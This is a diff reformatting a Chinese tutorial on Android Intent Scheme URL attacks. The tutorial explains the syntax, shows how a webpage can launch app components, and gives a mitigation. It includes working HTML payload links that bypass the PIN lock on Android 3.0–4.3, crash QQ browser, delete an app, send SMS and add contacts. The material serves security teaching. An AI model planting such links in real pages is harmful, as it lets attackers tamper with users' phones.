@@ -17,15 +17,17 @@ Android有一个很少人知道的特性可以通过web页面发送intent来启�
 “最佳实践”是构造一个intent插入网页中使用户能够登录app。这为您提供了更多的灵活性在控制应用程序是如何启动，包括传通过Intent Extras传递额外信息。
 intent-based URI基本语法如下：
 
-	intent:
-	   HOST/URI-path // Optional host
-	   #Intent;
-	      package=[string];
-	      action=[string];
-	      category=[string];
-	      component=[string];
-	      scheme=[string];
-	   end;
+```
+intent:
+   HOST/URI-path // Optional host
+   #Intent;
+      package=[string];
+      action=[string];
+      category=[string];
+      component=[string];
+      scheme=[string];
+   end;
+```
 
 语法细节见源码Android source
 
@@ -37,16 +39,20 @@ intent-based URI基本语法如下：
 
 例子是一个intent登陆应用“Zxing barcode scanner”，语法如下：
 
-	intent:
-	   //scan/
-	   #Intent;
-	      package=com.google.zxing.client.android;
-	      scheme=zxing;
-	   end;
+```
+intent:
+   //scan/
+   #Intent;
+      package=com.google.zxing.client.android;
+      scheme=zxing;
+   end;
+```
 
 设置a标签发href属性：
 
-	<a href="intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end"> Take a QR code </a>
+```
+<a href="intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end"> Take a QR code </a>
+```
 
 Package和host定义在配置文件中Android Zxing Manifest
 
@@ -70,24 +76,32 @@ Activity只有配置了category filter才有被android.intent.category.BROWSABLE
 
 看一下Intent Scheme URL的用法。
 
-	<script>location.href = “intent:mydata#Intent;action=myaction;type=text/plain;end”</script>  
+```
+<script>location.href = “intent:mydata#Intent;action=myaction;type=text/plain;end”</script>  
+```
 
 从用法上看，还是很好理解的，这里的代码等价于如下Java代码：
 
-	Intent intent = new Intent("myaction");  
-	intent.setData(Uri.parse("mydata"));  
-	intent.setType("text/plain");  
+```java
+Intent intent = new Intent("myaction");  
+intent.setData(Uri.parse("mydata"));  
+intent.setType("text/plain");  
+```
 
 再看一个例子：
 
-	intent://foobar/#Intent;action=myaction;type=text/plain;S.xyz=123;i.abc=678;end  
+```
+intent://foobar/#Intent;action=myaction;type=text/plain;S.xyz=123;i.abc=678;end  
+```
 
 上面的语句，等价于如下Java代码：
 
-	Intent intent = new Intent("myaction");  
-	intent.setData(Uri.pase("//foobar/"));  
-	intent.putExtra("xyz", "123");  
-	intent.putExtra("abc", 678);  
+```java
+Intent intent = new Intent("myaction");  
+intent.setData(Uri.pase("//foobar/"));  
+intent.putExtra("xyz", "123");  
+intent.putExtra("abc", 678);  
+```
 
 其中S代表String类型的key-value，i代表int类型的key-value。
 源码中提供了Intent.parseUri(String uri)静态方法，通过这个方法可以直接解析uri，如果想更一步了解其中的语法，可以查看官方源码。
@@ -108,7 +122,7 @@ Activity只有配置了category filter才有被android.intent.category.BROWSABLE
 
 绕过
 
-	Intent.setComponent(null);
+    Intent.setComponent(null);
 
 使用sel;
 
@@ -118,52 +132,57 @@ http://www.wooyun.org/bugs/wooyun-2014-073875
 http://www.wooyun.org/bugs/wooyun-2014-067798 
 
 某浏览器对此支持非常好
-	
+
+```javascript
 	<a href="intent:#Intent;action=android.settings.SETTINGS;S.:android:show_fragment=com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment;B.confirm_credentials=false;end">
 	   设置绕过Pin码（android 3.0-4.3）
 	</a><br>
- 
+```
+
 ![](img/pincode.png)
 
-	<a href="intent:#Intent;component=com.tencent.mtt/com.tencent.mtt.debug.DbgMemWatch;end">
-	    qq浏览器崩溃
-	</a><br>
- 
-	<a href="intent:http://drops.wooyun.org/webview.html#Intent;component=com.android.browser/com.android.browser.BrowserActivity;end">
-	    打开原生浏览器
-	</a><br>
- 
-	<a href="intent:smsto:10000#Intent;action=android.intent.action.SENDTO;end">
-	   发送短信
-	</a><br>
-	
-	<a href="intent:#Intent;action=android.media.action.STILL_IMAGE_CAMERA;end">
-	   打开相机
-	</a><br>
-	
-	<a href="intent:package:org.wooyun.hiwooyun#Intent;action=android.intent.action.DELETE;end">
-	   删除应用
-	</a><br>
-	
-	<a href="intent:#Intent;action=android.intent.action.INSERT_OR_EDIT;S.name=magic;S.phone=+8610000;i.phone_type=2;type=vnd.android.cursor.item/person;end">
-	    添加联系人
-	</a><br>
+```JavaScript
+<a href="intent:#Intent;component=com.tencent.mtt/com.tencent.mtt.debug.DbgMemWatch;end">
+    qq浏览器崩溃
+</a><br>
+
+<a href="intent:http://drops.wooyun.org/webview.html#Intent;component=com.android.browser/com.android.browser.BrowserActivity;end">
+    打开原生浏览器
+</a><br>
+
+<a href="intent:smsto:10000#Intent;action=android.intent.action.SENDTO;end">
+   发送短信
+</a><br>
+
+<a href="intent:#Intent;action=android.media.action.STILL_IMAGE_CAMERA;end">
+   打开相机
+</a><br>
+
+<a href="intent:package:org.wooyun.hiwooyun#Intent;action=android.intent.action.DELETE;end">
+   删除应用
+</a><br>
+
+<a href="intent:#Intent;action=android.intent.action.INSERT_OR_EDIT;S.name=magic;S.phone=+8610000;i.phone_type=2;type=vnd.android.cursor.item/person;end">
+    添加联系人
+</a><br>
+```
 
 ## 1.6  修复
 
 通过以上漏洞的描述，总结得出一种相对比较安全的Intent Filter方法，代码如下：
 
-	// convert intent scheme URL to intent object  
-	Intent intent = Intent.parseUri(uri);  
-	// forbid launching activities without BROWSABLE category  
-	intent.addCategory("android.intent.category.BROWSABLE");  
-	// forbid explicit call  
-	intent.setComponent(null);  
-	// forbid intent with selector intent  
-	intent.setSelector(null);  
-	// start the activity by the intent  
-	context.startActivityIfNeeded(intent, -1);  
-
+```java
+// convert intent scheme URL to intent object  
+Intent intent = Intent.parseUri(uri);  
+// forbid launching activities without BROWSABLE category  
+intent.addCategory("android.intent.category.BROWSABLE");  
+// forbid explicit call  
+intent.setComponent(null);  
+// forbid intent with selector intent  
+intent.setSelector(null);  
+// start the activity by the intent  
+context.startActivityIfNeeded(intent, -1);  
+```
 ## 1.7 参考
 
 http://www.mbsd.jp/Whitepaper/IntentScheme.pdf
